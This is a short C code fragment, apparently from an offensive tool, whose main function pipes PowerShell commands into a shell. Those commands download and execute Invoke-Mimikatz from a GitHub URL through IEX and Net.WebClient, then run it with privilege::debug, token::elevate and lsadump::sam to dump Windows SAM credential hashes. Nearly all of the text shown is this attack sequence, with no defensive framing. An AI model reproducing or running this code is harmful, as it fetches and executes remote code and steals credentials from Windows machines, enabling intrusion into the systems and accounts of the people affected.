...
INT main(INT argc, PCHAR *argv)
{
    ...
    WriteToPipe("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0x2034/tools/main/Invoke-Mimikatz.ps1')\n", 121); // 121 is no. of chars-1 
    WriteToPipe("Invoke-Mimikatz -Command '\"privilege::debug\"'\n", 46); 
    WriteToPipe("Invoke-Mimikatz -Command '\"token::elevate\"'\n", 44); 
    WriteToPipe("Invoke-Mimikatz -Command '\"lsadump::sam\"'\n", 42);
